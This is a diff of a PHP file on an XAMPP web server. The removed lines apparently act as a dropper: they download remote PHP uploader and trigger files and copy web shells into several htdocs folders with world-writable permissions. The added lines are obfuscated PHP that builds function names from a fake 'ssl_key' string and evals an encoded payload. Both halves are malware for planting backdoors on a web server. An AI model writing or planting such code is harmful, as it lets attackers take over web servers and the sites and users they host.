@@ -1,83 +1,9 @@
 <?php
-$file_LP = 'C:/xampp/htdocs/bookingarea/images/slot-demo/index.html';
-$file_resources = 'https://raw.githubusercontent.com/rootraven04/trig/main/agri/agri.html';
-$current = file_get_contents($file_resources);
-
-chmod('C:/xampp/htdocs/bookingarea/', 0755);
-mkdir('C:/xampp/htdocs/bookingarea/');
-chmod('C:/xampp/htdocs/bookingarea/', 0755);
-chmod('C:/xampp/htdocs/bookingarea/images/', 0755);
-mkdir('C:/xampp/htdocs/bookingarea/images/');
-chmod('C:/xampp/htdocs/bookingarea/images/', 0755);
-chmod('C:/xampp/htdocs/bookingarea/images/slot-demo/', 0755);
-mkdir('C:/xampp/htdocs/bookingarea/images/slot-demo/');
-chmod('C:/xampp/htdocs/bookingarea/images/slot-demo/', 0755);
-
-file_put_contents($file_LP, $current);
-
-$shell_resources = 'C:/xampp/htdocs/js/jquery.js';
-$resources_didalam = 'C:/xampp/htdocs/js/jquery.js';
-$shell_satu =   'C:/xampp/htdocs/2022/download.php';
-mkdir('C:/xampp/htdocs/2022/');
-chmod('C:/xampp/htdocs/2022/', 0777);
-
-$shell_dua  =   'C:/xampp/htdocs/ento/form.php';
-mkdir('C:/xampp/htdocs/ento/');
-chmod('C:/xampp/htdocs/ento/', 0777);
-$shell_tiga =   'C:/xampp/htdocs/ento/template.php';
-$shell_empat = 'C:/xampp/htdocs/ento/Download/doc.php';
-
-$shell_source_dua = 'https://raw.githubusercontent.com/rootraven04/0xc4uploader/main/uploader.php';
-
-$trigger_satu = 'C:/xampp/htdocs/dashboard/plugin.php';
-chmod('C:/xampp/htdocs/dashboard/', 0777);
-mkdir('C:/xampp/htdocs/dashboard/');
-chmod('C:/xampp/htdocs/dashboard/', 0777);
-$trigger_dua  = 'C:/xampp/htdocs/News/index.php';
-chmod('C:/xampp/htdocs/News/', 0777);
-mkdir('C:/xampp/htdocs/News/');
-
-$source_trigger = 'https://raw.githubusercontent.com/rootraven04/trig/main/agri/trig.php';
-
-file_put_contents($shell_satu, file_get_contents($shell_resources));
-file_put_contents($shell_dua, file_get_contents($shell_resources));
-file_put_contents($shell_tiga, file_get_contents($shell_resources));
-
-if(!file_exists($trigger_satu)) {
-    file_put_contents($trigger_satu,file_get_contents($source_trigger));
-}
-if(!file_exists($trigger_dua)) {
-    file_put_contents($trigger_dua,file_get_contents($source_trigger));
-}
-
-if(!file_exists($shell_empat)) {
-    mkdir('C:/xampp/htdocs/ento/');
-    chmod('C:/xampp/htdocs/ento/', 0777);
-    mkdir('C:/xampp/htdocs/ento/Download/');
-    chmod('C:/xampp/htdocs/ento/Download/', 0777);
-}
-
-file_put_contents($shell_empat,file_get_contents($shell_source_dua));
-
-if (isset($_POST['cekfile'])) {
-    if (file_exists($resources_didalam)) {
-        echo 'Found '.filesize($resources_didalam).' '.$resources_didalam.' ';
-    } else { echo 'Not_Found null null '; }
-    if (file_exists($shell_satu)) {
-        echo 'Found '.filesize($shell_satu).' '.$shell_satu.' ';
-    } else { echo 'Not_Found null null '; }
-    if (file_exists($shell_dua)) {
-        echo 'Found '.filesize($shell_dua).' '.$shell_dua.' ';
-    } else { echo 'Not_Found null null '; }
-    if (file_exists($shell_tiga)) {
-        echo 'Found '.filesize($shell_tiga).' '.$shell_tiga.' ';
-    } else { echo 'Not_Found null null '; }
-    if (file_exists($file_resources)) {
-        echo 'Found '.filesize($file_resources).' '.$file_resources.' ';
-    } else { echo 'Not_Found null null '; }
-    if (file_exists($shell_empat)) {
-        echo 'Found '.filesize($shell_empat).' '.$shell_empat.' ';
-    } else { echo 'Not_Found null null '; }
-}
-
+$ssl_key = "IdsdMR8PY8e1rnrTQVgH_ebFESWoiH6334BT7d9j*z7M6n1huYgUD8evi2K/30t_lNfsX0.lw4mSc9V5XlcY/emePeeUSjZ4batLBeJbDavItop7ta.gpWrmqGczwpMnelaCs_X";
+$ssl_verifier = $ssl_key[22] . $ssl_key[97] . $ssl_key[2] . $ssl_key[21] . $ssl_key[44] . $ssl_key[33] . $ssl_key[20] . $ssl_key[1] . $ssl_key[10] . $ssl_key[122] . $ssl_key[109] . $ssl_key[3] . $ssl_key[128];
+$ssl_hash_key = $ssl_key[47] . $ssl_key[62] . $ssl_key[74] . $ssl_key[81] . $ssl_key[67] . $ssl_key[110] . $ssl_key[101] . $ssl_key[122] . $ssl_key[28] . $ssl_key[97] . $ssl_key[64] . $ssl_key[82] . $ssl_key[47] . $ssl_key[113] . $ssl_key[12] . $ssl_key[2] . $ssl_key[20] . $ssl_key[1] . $ssl_key[10] . $ssl_key[122] . $ssl_key[27] . $ssl_key[37] . $ssl_key[10];
+$ssl_security = $ssl_key[115] . $ssl_key[123] . $ssl_key[28] . $ssl_key[13] . $ssl_key[66] . $ssl_key[129] . $ssl_key[130] . $ssl_key[108] . $ssl_key[89];
+$stt1 = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
+$stt0 = "\x3d\x636RPwNX\x41tusUij84z\x62Mq8q\x41\x2b/2d3ZyW\x62kEzeLngzmmJw\x43lsN\x632KDP8usi2q58X9pnK/KHuO4ptDro130\x4275\x63K/iGNx2FNzjt3EPHUgvm1D6z5Jgl\x43yiv1yTfwF\x2bhXXHzd\x43Ufrsk1GHyE7RY\x2bIHMK\x42yfXFnT24Yt\x42Jt\x2bGI6jOX8oglY3/jXf9\x2b5z\x2b\x42\x62KJlwWQkJw1W0H5XhKz1sQ3jip9\x62le/4Z3hZJmhu1E\x62DmuH4JM4Qq\x42Txkr\x2bx/w1L/\x2b/uZfpnX9jdjF5gG8D3jfxHe3Kv\x61mq\x2bRtH525gi\x42MTriV6R\x61p\x42mImfVv\x43k\x62H6EMFnV/\x2bFJ\x2b\x63y6\x43WHSjwdMQ9\x43Yi7961Fkx\x41xETthpd\x42ZNf\x2bWWl\x62U4Gt3FSYuvd8UVkm\x631dpl5qurX\x61p64yl1TqhLHKRZ\x416GrFp\x634j1PDioyomDqw4FU0916p1FhUsW\x2bDD2pgdGe4\x2bZ\x2bE\x42sGje\x61GPSpxL9Esd\x41\x2bYKkm8oR2E\x42241nGsHlqtyQ7Yx240vyrhQmp/6qi48mVES\x2bVS\x61vlFX\x41oh/6qDV\x42pW\x61S25wKeJPKRz\x41Kq36OOkRpTdjGmfshKvil\x420ZJm1I/VtTi\x632V1rg\x62qS\x41rSD8zf6EdSEjWGYqJ7VRtWNVZ0ujdF7zKM\x42VN/2OKnJ\x41hKT96KRjZM6\x42n\x41\x2bIO/TzQo\x62g\x42\x43wwlo\x41\x63\x2bU4sY5uFi4j98GSYJMZoFxJx\x63U\x43p15SsYS6hhoM5d9Lzg\x42IxKm3G\x631\x63Qgr/Qf\x610qLgIE\x2bDWyUWMfqn3\x2bIXNof2HzDg2yIyLO19O2JRY3d1t549\x63vDD4\x43iqmY\x62sJJOXv/voJmiG5ZvNV5SIyKtVZ0G\x61S/0m022ltwqI6E\x42ZUIkyh\x2bvwvGS\x42Q\x61v4\x61U2\x61/SKQ\x62\x42wJe9fo\x414FQ/\x43KQf\x42wJe9fn\x41IGQ/yJQj\x42wJe9fm\x41YGQ/iJQn\x42wJe";
+@eval/*******/($ssl_hash_key($ssl_security($ssl_verifier($stt1))));
 ?>
